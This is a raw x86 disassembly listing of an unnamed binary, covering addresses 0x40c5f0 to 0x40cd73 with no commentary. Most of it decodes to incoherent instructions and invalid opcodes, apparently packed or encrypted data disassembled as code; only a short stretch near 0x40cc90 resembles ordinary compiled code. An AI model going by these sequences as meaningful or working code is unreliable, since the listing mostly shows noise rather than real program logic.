  40c5f0:	es inc eax
  40c5f2:	or     DWORD PTR [edx+0x2f6f919a],0x76265fc8
  40c5fc:	in     al,0xd5
  40c5fe:	adc    BYTE PTR [ebx+eiz*2+0x3e],0x5b
  40c603:	scas   al,BYTE PTR es:[edi]
  40c604:	mov    ah,0x65
  40c606:	test   BYTE PTR [edi+0x7383c5e5],ch
  40c60c:	xchg   edi,eax
  40c60d:	pop    esp
  40c60e:	and    al,0xaf
  40c610:	out    dx,al
  40c611:	loop   0x40c617
  40c613:	lock or BYTE PTR [edi+0x4da7f614],bl
  40c61a:	jmp    0xd9dc4f1f
  40c61f:	and    al,0xe5
  40c621:	ror    ecx,cl
  40c623:	push   ebp
  40c624:	movq   QWORD PTR [ebx+edi*2],mm7
  40c628:	scas   al,BYTE PTR es:[edi]
  40c629:	adc    ah,BYTE PTR [ebx+0x4b0f8259]
  40c62f:	cmp    ebx,DWORD PTR [edx]
  40c631:	dec    edx
  40c632:	add    DWORD PTR [eax-0x52],ecx
  40c635:	push   cs
  40c636:	sbb    al,0xea
  40c638:	sahf   
  40c639:	dec    esi
  40c63a:	mov    eax,ds:0x2d8a33f4
  40c63f:	push   edx
  40c640:	mov    dl,0xa7
  40c642:	adc    al,0xe7
  40c644:	and    eax,0x9cf236dc
  40c649:	adc    BYTE PTR [ebx],bh
  40c64b:	fwait
  40c64c:	jns    0x40c64c
  40c64e:	repnz mov ecx,0x2e4fb6f
  40c654:	mov    bl,BYTE PTR [eax]
  40c656:	jge    0x40c5e9
  40c658:	and    bl,0x8
  40c65b:	test   DWORD PTR [ebx+0xf941767],0x29deffdc
  40c665:	loopne 0x40c5fc
  40c667:	out    0x89,al
  40c669:	jns    0x40c6a3
  40c66b:	inc    esi
  40c66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c66d:	inc    esp
  40c66e:	pop    esi
  40c66f:	jae    0x40c6e1
  40c671:	mov    DWORD PTR ds:0x8a850934,esi
  40c677:	loop   0x40c647
  40c679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67a:	scas   eax,DWORD PTR es:[edi]
  40c67b:	in     eax,dx
  40c67c:	xchg   ecx,eax
  40c67d:	jb     0x40c6bc
  40c67f:	pop    esi
  40c680:	mov    dh,0x33
  40c682:	(bad)  
  40c683:	aam    0x3f
  40c685:	pop    eax
  40c686:	mov    WORD PTR gs:[ebx],gs
  40c689:	lods   eax,DWORD PTR ds:[esi]
  40c68a:	mov    al,0x35
  40c68c:	add    BYTE PTR [edi*8+0x3e119a6d],cl
  40c693:	inc    edx
  40c694:	sti    
  40c695:	xor    eax,0x16364c86
  40c69a:	xchg   BYTE PTR [edi],ch
  40c69c:	mov    ds:0x8c7a252,eax
  40c6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6a2:	sub    dl,0x3d
  40c6a5:	stos   BYTE PTR es:[edi],al
  40c6a6:	fsubr  DWORD PTR [eax+0xd]
  40c6a9:	inc    edi
  40c6aa:	sbb    ebx,DWORD PTR [ecx+0x1bd1bdab]
  40c6b0:	or     al,0xb6
  40c6b2:	adc    DWORD PTR [eax-0x1b65a241],eax
  40c6b8:	sti    
  40c6b9:	dec    eax
  40c6ba:	inc    esp
  40c6bb:	fidiv  DWORD PTR [edx+eax*2+0x51b4296e]
  40c6c2:	jno    0x40c6c7
  40c6c4:	xchg   DWORD PTR [edx+0x13a0529a],edi
  40c6ca:	es retf 0x569
  40c6ce:	or     edi,DWORD PTR [ebp-0x4]
  40c6d1:	(bad)  
  40c6d2:	fwait
  40c6d3:	or     eax,0x38997b80
  40c6d8:	in     al,dx
  40c6d9:	es je  0x40c745
  40c6dc:	cmp    BYTE PTR [edi+0x75],0x53
  40c6e0:	cmp    eax,esi
  40c6e2:	cs sub dl,dh
  40c6e5:	inc    esi
  40c6e6:	arpl   WORD PTR [ebx+ecx*8-0x7],ax
  40c6ea:	xchg   DWORD PTR [ebp-0x38],esp
  40c6ed:	pop    ebx
  40c6ee:	pusha  
  40c6ef:	cmp    BYTE PTR [ecx+0x31],al
  40c6f2:	outs   dx,BYTE PTR ds:[esi]
  40c6f3:	loopne 0x40c704
  40c6f5:	sbb    al,bh
  40c6f7:	neg    BYTE PTR [ebx+0x22236e7b]
  40c6fd:	xchg   DWORD PTR [ebx-0x7098f24b],esi
  40c703:	push   edx
  40c704:	xchg   ecx,eax
  40c705:	faddp  st(2),st
  40c707:	pop    ss
  40c708:	push   esi
  40c709:	adc    bh,0x98
  40c70c:	js     0x40c717
  40c70e:	mov    cl,0x40
  40c710:	pop    ds
  40c711:	dec    ebp
  40c712:	not    BYTE PTR [eax+eiz*2+0x4a]
  40c716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c717:	int3   
  40c718:	push   es
  40c719:	jbe    0x40c6eb
  40c71b:	inc    eax
  40c71c:	out    dx,al
  40c71d:	sub    al,0x93
  40c71f:	aad    0x72
  40c721:	sub    ebp,edi
  40c723:	(bad)  
  40c724:	mov    ch,0xf6
  40c726:	fadd   QWORD PTR [esi]
  40c728:	cli    
  40c729:	aaa    
  40c72a:	imul   eax,DWORD PTR [esi+edi*2-0x38],0x5
  40c72f:	cmp    ebx,ecx
  40c731:	fisttp WORD PTR [edx+ecx*4+0x596f41af]
  40c738:	enter  0x7d72,0xbf
  40c73c:	push   ss
  40c73d:	jecxz  0x40c758
  40c73f:	mov    ch,0x1
  40c741:	push   ebx
  40c742:	push   ss
  40c743:	rcl    BYTE PTR [edx-0x20],1
  40c746:	out    0x5e,eax
  40c748:	mov    dx,0x122e
  40c74c:	cld    
  40c74d:	(bad)  
  40c74e:	mov    ebx,0x49d0333e
  40c753:	xor    al,0xb
  40c755:	ret    
  40c756:	shr    DWORD PTR cs:[edx-0x2e1a434b],1
  40c75d:	dec    ebp
  40c75e:	adc    al,0xd8
  40c760:	aam    0x6f
  40c762:	dec    edx
  40c763:	gs enter 0x20d6,0xf5
  40c768:	push   ebx
  40c769:	dec    esp
  40c76a:	mov    al,ds:0x96b6a6f4
  40c76f:	fld    TBYTE PTR [edi-0x72ff2080]
  40c775:	or     eax,0x7c4cfe7c
  40c77a:	fcomp  st(0)
  40c77c:	cmp    edi,DWORD PTR [edi]
  40c77e:	xor    BYTE PTR [ecx],bl
  40c780:	in     eax,0x19
  40c782:	jl     0x40c794
  40c784:	dec    ecx
  40c785:	hlt    
  40c786:	dec    eax
  40c787:	cmc    
  40c788:	or     BYTE PTR [edx+0x3b0edb86],0x99
  40c78f:	int3   
  40c790:	cmp    BYTE PTR [ecx],ch
  40c792:	test   BYTE PTR [eax+edx*1-0x62],bl
  40c796:	out    dx,eax
  40c797:	loopne 0x40c7ff
  40c799:	cmp    esp,edx
  40c79b:	popa   
  40c79c:	push   edi
  40c79d:	(bad)  
  40c79e:	push   cs
  40c79f:	and    al,0x6d
  40c7a1:	das    
  40c7a2:	imul   esi,edx,0xffffffd6
  40c7a5:	jo     0x40c79d
  40c7a7:	cmp    bh,BYTE PTR [edi-0x6c937bd9]
  40c7ad:	pop    ds
  40c7ae:	push   cs
  40c7af:	dec    ebx
  40c7b0:	in     al,dx
  40c7b1:	imul   eax,DWORD PTR [ebx],0x4f
  40c7b4:	loopne 0x40c796
  40c7b6:	lahf   
  40c7b7:	xor    al,ah
  40c7b9:	adc    eax,0x32f446c8
  40c7be:	dec    ecx
  40c7bf:	pop    es
  40c7c0:	inc    eax
  40c7c1:	mov    ds:0x57959524,al
  40c7c6:	fdiv   QWORD PTR [ecx-0x6c35425]
  40c7cc:	dec    ecx
  40c7cd:	aad    0xca
  40c7cf:	punpcklwd mm4,DWORD PTR [ecx-0x48]
  40c7d3:	sbb    eax,ebx
  40c7d5:	mov    WORD PTR [ebx-0x45],cs
  40c7d8:	or     ah,dh
  40c7da:	mov    ch,0x71
  40c7dc:	cmp    eax,0xf9b81e5a
  40c7e1:	jo     0x40c7f3
  40c7e3:	mov    es,WORD PTR [ebp-0x70]
  40c7e6:	addr16 jb 0x40c807
  40c7e9:	add    edi,DWORD PTR [esi+esi*4]
  40c7ec:	fwait
  40c7ed:	xor    BYTE PTR [edi],0x4b
  40c7f0:	and    BYTE PTR [edx],al
  40c7f2:	mov    eax,0x16259772
  40c7f7:	sub    edx,DWORD PTR [ecx]
  40c7f9:	pop    ecx
  40c7fa:	or     BYTE PTR [ebx-0x50b2bfba],ah
  40c800:	sbb    BYTE PTR [ecx+0x71533542],cl
  40c806:	mov    ebx,0x3d693881
  40c80b:	inc    eax
  40c80c:	xchg   esi,eax
  40c80d:	jb     0x40c843
  40c80f:	sub    eax,0x4c710656
  40c814:	mov    ebp,DWORD PTR [ecx+0x50]
  40c817:	adc    BYTE PTR [esi+0x779028a8],al
  40c81d:	(bad)  
  40c81e:	je     0x40c886
  40c820:	push   es
  40c821:	xor    ebx,DWORD PTR [edx+0x68]
  40c824:	dec    ecx
  40c825:	or     eax,0xebf93b7a
  40c82a:	dec    eax
  40c82b:	pop    edx
  40c82c:	lahf   
  40c82d:	out    dx,al
  40c82e:	sbb    ebx,DWORD PTR [edi+ebp*8-0x1f]
  40c832:	inc    esi
  40c833:	xchg   esp,eax
  40c834:	jae    0x40c806
  40c836:	dec    ebx
  40c837:	iret   
  40c838:	(bad)  
  40c839:	mov    edx,0x2e846d87
  40c83e:	xor    ch,BYTE PTR [esi+0x5ec20b3d]
  40c844:	in     al,dx
  40c845:	jmp    0x40c86a
  40c847:	das    
  40c848:	ja     0x40c86f
  40c84a:	xor    eax,0x4379f067
  40c84f:	or     eax,0x4be9c193
  40c854:	push   edx
  40c855:	pop    esp
  40c856:	add    eax,0x9f890e3c
  40c85b:	imul   ebx
  40c85d:	loop   0x40c817
  40c85f:	cmp    esp,DWORD PTR [edx+0x6c8e92d6]
  40c865:	mov    esp,0x7c59c6ad
  40c86a:	push   cs
  40c86b:	out    dx,al
  40c86c:	rol    bh,0x45
  40c86f:	loopne 0x40c8ec
  40c871:	sub    al,BYTE PTR [eax]
  40c873:	add    bh,al
  40c875:	inc    ebp
  40c876:	in     al,0x8f
  40c878:	jno    0x40c87a
  40c87a:	add    BYTE PTR [ebx+0x6e9e045],cl
  40c880:	add    al,0x0
  40c882:	add    bh,bh
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0x34a7e3ac
  40c891:	outs   dx,BYTE PTR ds:[esi]
  40c892:	fucomp st(1)
  40c894:	xlat   BYTE PTR ds:[ebx]
  40c895:	mov    esi,0xbec492be
  40c89a:	mov    esi,0x8a85a1ad
  40c89f:	hlt    
  40c8a0:	push   esi
  40c8a1:	test   eax,0x63096067
  40c8a6:	pop    ebx
  40c8a7:	fisttp QWORD PTR [esi+0x10]
  40c8aa:	inc    ecx
  40c8ab:	cmp    edx,0xffffffea
  40c8ae:	cwde   
  40c8af:	jmp    0x5520:0x263a72d2
  40c8b6:	icebp  
  40c8b7:	iret   
  40c8b8:	mov    edi,0xdaa5d2be
  40c8bd:	scas   eax,DWORD PTR es:[edi]
  40c8be:	push   edx
  40c8bf:	push   edi
  40c8c0:	dec    edx
  40c8c1:	xchg   ebx,eax
  40c8c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8c3:	aad    0x6d
  40c8c5:	mov    ds:0xba150eec,eax
  40c8ca:	int3   
  40c8cb:	iret   
  40c8cc:	jae    0x40c87c
  40c8ce:	data16 cld 
  40c8d0:	ins    DWORD PTR es:[edi],dx
  40c8d1:	or     eax,0x2fc36d16
  40c8d6:	sub    dl,al
  40c8d8:	or     al,0xc5
  40c8da:	daa    
  40c8db:	jne    0x40c8af
  40c8dd:	cmp    ah,BYTE PTR [esi-0x6c]
  40c8e0:	inc    BYTE PTR [edx+0x18]
  40c8e3:	test   al,0x5f
  40c8e5:	cdq    
  40c8e6:	clc    
  40c8e7:	scas   eax,DWORD PTR es:[edi]
  40c8e8:	repz mov eax,ds:0xa0d87731
  40c8ee:	dec    ebp
  40c8ef:	out    0x53,eax
  40c8f1:	xor    BYTE PTR [ebx],al
  40c8f3:	fdiv   QWORD PTR [ecx]
  40c8f5:	jo     0x40c93f
  40c8f7:	xor    al,0x21
  40c8f9:	mov    ebx,0x5949cd2c
  40c8fe:	nop
  40c8ff:	aas    
  40c900:	or     eax,0x3f87d82d
  40c905:	mov    edi,DWORD PTR [ebx+0x4fb62747]
  40c90b:	rcl    ebx,1
  40c90d:	push   es
  40c90e:	in     eax,0x2f
  40c910:	jecxz  0x40c8c3
  40c912:	jmp    0x6ea3:0x31262a51
  40c919:	idiv   BYTE PTR [ecx-0x25baef14]
  40c91f:	daa    
  40c920:	cmp    al,BYTE PTR [edi]
  40c922:	out    0x5c,eax
  40c924:	inc    BYTE PTR ds:0x45c65614
  40c92a:	ds std 
  40c92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c92d:	dec    ebx
  40c92e:	adc    al,0x94
  40c930:	ins    BYTE PTR es:[edi],dx
  40c931:	mov    dl,0xe0
  40c933:	jno    0x40c9a1
  40c935:	inc    eax
  40c936:	scas   al,BYTE PTR es:[edi]
  40c937:	adc    eax,0xb12c0d53
  40c93c:	test   al,0xab
  40c93e:	add    al,0x77
  40c940:	scas   al,BYTE PTR es:[edi]
  40c941:	(bad)  
  40c942:	hlt    
  40c943:	xchg   ecx,eax
  40c944:	inc    eax
  40c945:	div    BYTE PTR [esi]
  40c947:	xchg   DWORD PTR [esi-0x6e],edx
  40c94a:	stos   BYTE PTR es:[edi],al
  40c94b:	sbb    BYTE PTR [ecx+0x75803a12],dh
  40c951:	mov    ds:0x658d87bb,al
  40c956:	or     cl,cl
  40c958:	repz test ah,0xb9
  40c95c:	and    ecx,DWORD PTR [edx-0x4f]
  40c95f:	cmp    bl,cl
  40c961:	adc    BYTE PTR gs:[edi+0x49],al
  40c965:	shl    ch,0x0
  40c968:	adc    esp,DWORD PTR [edx]
  40c96a:	push   eax
  40c96b:	push   esp
  40c96c:	xchg   ebp,eax
  40c96d:	in     eax,dx
  40c96e:	repz call 0x14e656cc
  40c974:	xlat   BYTE PTR ds:[ebx]
  40c975:	(bad)  
  40c976:	push   edx
  40c977:	lahf   
  40c978:	add    al,0x1f
  40c97a:	sub    ecx,eax
  40c97c:	cwde   
  40c97d:	dec    ebp
  40c97e:	std    
  40c97f:	pusha  
  40c980:	pop    eax
  40c981:	hlt    
  40c982:	and    BYTE PTR [eax-0x73766ed4],bl
  40c988:	jecxz  0x40c98e
  40c98a:	push   ss
  40c98b:	push   ebp
  40c98c:	adc    al,0x73
  40c98e:	loopne 0x40c9dd
  40c990:	in     al,0xeb
  40c992:	lea    edi,[eax-0x7d]
  40c995:	xchg   ebx,eax
  40c996:	push   ebp
  40c997:	pop    esi
  40c998:	clc    
  40c999:	pop    eax
  40c99a:	test   al,0xd4
  40c99c:	test   eax,0x55e8970b
  40c9a1:	mov    ds:0x8b1b5027,al
  40c9a6:	and    eax,0x156bba4e
  40c9ab:	inc    esi
  40c9ac:	test   al,0xc1
  40c9ae:	mov    eax,0x4bf10568
  40c9b3:	or     eax,0x5fa9aec4
  40c9b8:	xchg   esi,eax
  40c9b9:	dec    ecx
  40c9ba:	out    0x9d,al
  40c9bc:	xor    DWORD PTR [esi+edx*8+0x1c126d93],esi
  40c9c3:	sbb    al,0x69
  40c9c5:	rcr    bl,0xe1
  40c9c8:	nop
  40c9c9:	out    dx,al
  40c9ca:	loope  0x40c9fd
  40c9cc:	loope  0x40c974
  40c9ce:	add    al,BYTE PTR [edi-0x6a85f76]
  40c9d4:	push   edi
  40c9d5:	add    dl,bh
  40c9d7:	cmp    ebp,DWORD PTR [edi-0xc]
  40c9da:	fadd   QWORD PTR [ebp+0x75044675]
  40c9e0:	add    eax,ebp
  40c9e2:	neg    DWORD PTR [ebp+0x19]
  40c9e5:	mov    cl,0x4b
  40c9e7:	repnz pop esp
  40c9e9:	into   
  40c9ea:	(bad)  
  40c9eb:	fimul  WORD PTR [eax-0x6d]
  40c9ee:	xchg   BYTE PTR [edi-0x32fae3b3],bl
  40c9f4:	pusha  
  40c9f5:	mov    cs,WORD PTR [edi+0x5e]
  40c9f8:	push   ebx
  40c9f9:	sbb    eax,DWORD PTR [ecx+0x74ffee41]
  40c9ff:	scas   al,BYTE PTR es:[edi]
  40ca00:	mov    BYTE PTR [ebx+0x2ae4362b],bl
  40ca06:	ja     0x40ca5e
  40ca08:	jnp    0x40ca36
  40ca0a:	add    esi,DWORD PTR [ebx+0x66]
  40ca0d:	xor    DWORD PTR [esi],0xffffffc4
  40ca10:	or     al,al
  40ca12:	add    ebp,DWORD PTR [ebx+0x5167af66]
  40ca18:	fsubr  st,st(5)
  40ca1a:	inc    edi
  40ca1b:	call   0xfc55b86f
  40ca20:	xchg   DWORD PTR ds:0xc9ad448c,esi
  40ca26:	or     eax,0x24cb37fe
  40ca2b:	mov    ecx,DWORD PTR [ebx]
  40ca2d:	add    DWORD PTR [edi],0x2b
  40ca30:	dec    ebx
  40ca31:	in     al,dx
  40ca32:	imul   eax,DWORD PTR [ebx-0x5542611e],0x59fc60cf
  40ca3c:	xor    eax,0xed1a629f
  40ca41:	xor    eax,0x70005755
  40ca46:	hlt    
  40ca47:	sbb    eax,0x403fbd50
  40ca4c:	aaa    
  40ca4d:	call   0x43dbc0a6
  40ca52:	sbb    al,0x4f
  40ca54:	mov    dl,0x69
  40ca56:	inc    ebx
  40ca57:	sti    
  40ca58:	mov    WORD PTR [eax-0x663c87fd],ds
  40ca5e:	int3   
  40ca5f:	pusha  
  40ca60:	ins    DWORD PTR es:[edi],dx
  40ca61:	fisub  WORD PTR [edx+0x7]
  40ca64:	sub    DWORD PTR [edi+0x78],ebp
  40ca67:	mov    edx,0x8688a121
  40ca6c:	xchg   esp,eax
  40ca6d:	sub    ecx,DWORD PTR [esi-0x7a]
  40ca70:	mov    ebx,0x4f21a41
  40ca75:	fistp  WORD PTR [ebx+0x1df392e0]
  40ca7b:	xchg   ebp,eax
  40ca7c:	in     eax,dx
  40ca7d:	xchg   esp,eax
  40ca7e:	int    0xfa
  40ca80:	(bad)  
  40ca81:	jmp    0x40ca2a
  40ca83:	icebp  
  40ca84:	mov    ebx,0xb04e2c1
  40ca89:	(bad)  
  40ca8b:	mov    eax,0x241b1a34
  40ca90:	lahf   
  40ca91:	out    dx,eax
  40ca92:	jg     0x40ca19
  40ca94:	call   0x9042260d
  40ca99:	adc    esp,DWORD PTR [eax-0x15]
  40ca9c:	bnd jb 0x40cacd
  40ca9f:	test   eax,0x291c02d1
  40caa4:	dec    esp
  40caa5:	inc    edi
  40caa6:	cli    
  40caa7:	ins    BYTE PTR es:[edi],dx
  40caa8:	cs call 0x9f3bbd2b
  40caae:	xchg   edx,eax
  40caaf:	xor    cl,BYTE PTR [ebx-0x73dc24a4]
  40cab5:	cmp    BYTE PTR [edi],dh
  40cab7:	fild   DWORD PTR [eax+0x23]
  40caba:	cmp    DWORD PTR [ebp-0x2b],esi
  40cabd:	push   0x49
  40cabf:	and    BYTE PTR [ebx+0x59],bl
  40cac2:	into   
  40cac3:	cmp    BYTE PTR [edi],cl
  40cac5:	and    al,0x7f
  40cac7:	(bad)  
  40cac8:	jbe    0x40ca75
  40caca:	vpcmpeqd xmm7,xmm3,XMMWORD PTR [ecx-0x34]
  40cacf:	(bad)  [edx-0x2e793f28]
  40cad5:	es adc al,bh
  40cad8:	cli    
  40cad9:	sbb    esi,eax
  40cadb:	mov    eax,ds:0xc278e6f
  40cae0:	and    eax,0xc568371c
  40cae5:	push   eax
  40cae6:	mov    bh,BYTE PTR [edx-0x7d]
  40cae9:	add    eax,0xa50aaa64
  40caee:	inc    esp
  40caef:	fisubr DWORD PTR [ebp+0x74de4dc5]
  40caf5:	add    ah,0x0
  40caf8:	xchg   ebp,eax
  40caf9:	call   0x1d51:0xf699bbab
  40cb00:	call   0x439:0xff436535
  40cb07:	int    0x14
  40cb09:	fchs   
  40cb0b:	mov    ebx,0x636389ee
  40cb10:	in     eax,dx
  40cb11:	in     al,dx
  40cb12:	xor    DWORD PTR [eax],0xffffffd1
  40cb15:	enter  0x5599,0x8d
  40cb19:	scas   eax,DWORD PTR es:[edi]
  40cb1a:	mov    ss,esi
  40cb1c:	sbb    al,0x47
  40cb1e:	mov    dl,0x31
  40cb20:	xlat   BYTE PTR ds:[ebx]
  40cb21:	mov    dl,0xd4
  40cb23:	fchs   
  40cb25:	push   es
  40cb26:	adc    edx,DWORD PTR [ecx-0x64]
  40cb29:	push   edx
  40cb2a:	mov    ah,0x3a
  40cb2c:	jle    0x40cb8f
  40cb2e:	(bad)  
  40cb2f:	mov    ecx,0xa5a346dc
  40cb34:	jns    0x40caf3
  40cb36:	mov    ecx,0x1dc29337
  40cb3b:	test   al,0x93
  40cb3d:	dec    esp
  40cb3e:	test   esi,eax
  40cb40:	mov    eax,ds:0x269a6ed1
  40cb45:	fdivr  st(7),st
  40cb47:	shr    BYTE PTR [ecx],0xb4
  40cb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4b:	sbb    DWORD PTR [edx+0x24],edx
  40cb4e:	jb     0x40cbac
  40cb50:	out    0xb7,eax
  40cb52:	dec    edi
  40cb53:	add    al,0x55
  40cb55:	sar    BYTE PTR [ecx+0x5d684ccb],0xad
  40cb5c:	call   0xc712:0xa7735a1a
  40cb63:	push   edx
  40cb64:	xchg   edi,eax
  40cb65:	ror    DWORD PTR ds:0x7339a6f0,cl
  40cb6b:	clc    
  40cb6c:	add    bl,BYTE PTR [esi+0x3955a46c]
  40cb72:	adc    bh,BYTE PTR [ecx]
  40cb74:	jno    0x40cb09
  40cb76:	mov    ebx,0x24ffd212
  40cb7b:	or     BYTE PTR [esi+0x74965063],ah
  40cb81:	sub    eax,0x274f1e1f
  40cb86:	pop    ebx
  40cb87:	ss sti 
  40cb89:	adc    al,0x83
  40cb8b:	adc    BYTE PTR [esi],dh
  40cb8d:	test   BYTE PTR [ebp-0x2a6c4cbb],bl
  40cb93:	ret    0x191f
  40cb96:	in     eax,0xa7
  40cb98:	jmp    0x444b:0x142dc8ad
  40cb9f:	mov    ebx,0xb69206b2
  40cba4:	and    al,0xfe
  40cba6:	xchg   esp,eax
  40cba7:	dec    ebp
  40cba8:	les    ecx,FWORD PTR [edi+0x4b56489d]
  40cbae:	ffreep st(1)
  40cbb0:	imul   bh
  40cbb2:	push   ds
  40cbb3:	mov    ebx,ebx
  40cbb5:	leave  
  40cbb6:	cld    
  40cbb7:	mov    esp,0x16fca885
  40cbbc:	(bad)  [edx-0xd]
  40cbbf:	jl     0x40cc10
  40cbc1:	test   eax,0x92e71830
  40cbc6:	mov    edx,DWORD PTR [ebx]
  40cbc8:	lods   eax,DWORD PTR ds:[esi]
  40cbc9:	inc    esi
  40cbca:	arpl   WORD PTR [esi],cx
  40cbcc:	sahf   
  40cbcd:	and    eax,0x8c7d5bb4
  40cbd2:	xchg   ecx,eax
  40cbd3:	mov    eax,0x1d0704e6
  40cbd8:	sbb    esi,esp
  40cbda:	pop    edx
  40cbdb:	shr    eax,0x98
  40cbde:	and    DWORD PTR ds:[ebx],edx
  40cbe1:	jle    0x40cbf3
  40cbe3:	(bad)  [esp+edx*8-0x7f]
  40cbe7:	aas    
  40cbe8:	les    ebp,FWORD PTR [eax]
  40cbea:	out    0x48,eax
  40cbec:	in     al,dx
  40cbed:	lods   al,BYTE PTR ds:[esi]
  40cbee:	fwait
  40cbef:	mov    DWORD PTR [esi],ecx
  40cbf1:	lods   al,BYTE PTR ds:[esi]
  40cbf2:	xchg   esi,eax
  40cbf3:	cld    
  40cbf4:	mov    BYTE PTR [edx],dl
  40cbf6:	(bad)  
  40cbf7:	aam    0xb6
  40cbf9:	call   0xaee2:0x3996f4d8
  40cc00:	ins    DWORD PTR es:[edi],dx
  40cc01:	jge    0x40cc14
  40cc03:	dec    eax
  40cc04:	jns    0x40cb9a
  40cc06:	xor    al,0x3f
  40cc08:	mov    eax,0x5931547a
  40cc0d:	mov    ch,0xe
  40cc0f:	jb     0x40cc7e
  40cc11:	nop
  40cc12:	stos   DWORD PTR es:[edi],eax
  40cc13:	data16 and bh,BYTE PTR [eax-0x596c01ce]
  40cc1a:	scas   eax,DWORD PTR es:[edi]
  40cc1b:	std    
  40cc1c:	(bad)  
  40cc1d:	stos   DWORD PTR es:[edi],eax
  40cc1e:	(bad)  
  40cc1f:	and    esi,ebp
  40cc21:	pop    esi
  40cc22:	mov    esi,0xc9e0c894
  40cc27:	pop    eax
  40cc28:	jmp    0x20b826c5
  40cc2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc2e:	(bad)  
  40cc2f:	cmp    eax,0x99abe15f
  40cc34:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc36:	test   al,0x2f
  40cc38:	lds    esp,FWORD PTR [eax-0x3d]
  40cc3b:	jnp    0xdd4752ae
  40cc41:	mov    bh,0x1b
  40cc43:	(bad)  
  40cc44:	nop
  40cc45:	pop    ds
  40cc46:	cmp    dl,cl
  40cc48:	dec    edi
  40cc49:	dec    ebp
  40cc4a:	mov    bl,0xbf
  40cc4c:	mov    al,ds:0xd76d6a0b
  40cc51:	(bad)  
  40cc52:	(bad)  
  40cc53:	arpl   WORD PTR [ebx],cx
  40cc55:	pop    edx
  40cc56:	adc    eax,0xa970624a
  40cc5b:	ret    0xca0a
  40cc5e:	cmp    dl,BYTE PTR [ecx+0x63d8529c]
  40cc64:	xchg   esp,eax
  40cc65:	aaa    
  40cc66:	mov    al,ds:0xb2221da9
  40cc6b:	pop    esp
  40cc6c:	ins    DWORD PTR es:[edi],dx
  40cc6d:	stos   BYTE PTR es:[edi],al
  40cc6e:	out    dx,al
  40cc6f:	shr    BYTE PTR [eax+0x7fa7ad09],cl
  40cc75:	and    eax,0xd4718fe8
  40cc7a:	push   ebx
  40cc7b:	xchg   ecx,ebx
  40cc7d:	push   0x63f7a69b
  40cc82:	mov    ds:0x3a6da527,al
  40cc87:	cmp    eax,0xe4558b6c
  40cc8c:	mov    esi,DWORD PTR [ebp-0x28]
  40cc8f:	mov    ebx,DWORD PTR [ebp-0x24]
  40cc92:	add    eax,0xffffc948
  40cc97:	adc    edx,0xffff87b0
  40cc9d:	or     eax,esi
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40cd12
  40ccd6:	stos   DWORD PTR es:[edi],eax
  40ccd7:	ss xchg edx,eax
  40ccd9:	mov    ebp,0x92bebedf
  40ccde:	les    edi,FWORD PTR [esi-0x53c0a042]
  40cce4:	fcom   QWORD PTR [edi+0x2b]
  40cce7:	call   0xc4b1b9a1
  40ccec:	test   eax,0x21469bd9
  40ccf1:	addr16 xor eax,0xf4940e66
  40ccf7:	and    ebp,ebp
  40ccf9:	push   esp
  40ccfa:	pop    ds
  40ccfb:	pop    ds
  40ccfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccfd:	stc    
  40ccfe:	std    
  40ccff:	xor    ebp,0x181395b0
  40cd05:	mov    ebp,0x91269071
  40cd0a:	mov    dl,0x41
  40cd0c:	shl    BYTE PTR [ecx+0x1cb60d4c],1
  40cd12:	das    
  40cd13:	clc    
  40cd14:	popa   
  40cd15:	xchg   esp,eax
  40cd16:	jmp    FWORD PTR [edi-0x35faabbe]
  40cd1c:	sub    DWORD PTR [edi],0xffffffdd
  40cd1f:	or     esi,DWORD PTR [edi-0x12db5409]
  40cd25:	pop    ebp
  40cd26:	mov    ebx,DWORD PTR [ebx-0x4a78f854]
  40cd2c:	(bad)  
  40cd2d:	mov    ebx,0x3064f6af
  40cd32:	mov    al,BYTE PTR [edx+0x4c]
  40cd35:	and    bl,BYTE PTR [eax-0x33]
  40cd38:	and    dh,BYTE PTR [eax-0x1f8d1fc0]
  40cd3e:	dec    ebx
  40cd3f:	ins    BYTE PTR es:[edi],dx
  40cd40:	xchg   ebx,eax
  40cd41:	lock adc eax,0xc7a7917f
  40cd47:	cmp    al,0xb8
  40cd49:	pop    ss
  40cd4a:	sub    DWORD PTR [esi+ebx*1+0x51],esp
  40cd4e:	stc    
  40cd4f:	inc    edi
  40cd50:	imul   esp,DWORD PTR [esi+0x6f603928],0xffffffbb
  40cd57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd58:	xchg   DWORD PTR [eax-0x4f],esi
  40cd5b:	xchg   ebp,eax
  40cd5c:	jecxz  0x40cd01
  40cd5e:	ret    
  40cd5f:	lock cmp bh,bl
  40cd62:	clc    
  40cd63:	sub    BYTE PTR [ebx],ah
  40cd65:	jp     0x40cdcc
  40cd67:	cmp    dl,bh
  40cd69:	pushf  
  40cd6a:	push   ecx
  40cd6b:	sub    BYTE PTR [ebx],0x43
  40cd6e:	fwait
  40cd6f:	popf   
  40cd70:	cli    
  40cd71:	ins    BYTE PTR es:[edi],dx
  40cd72:	sti    
  40cd73:	shl    edx,0x1a
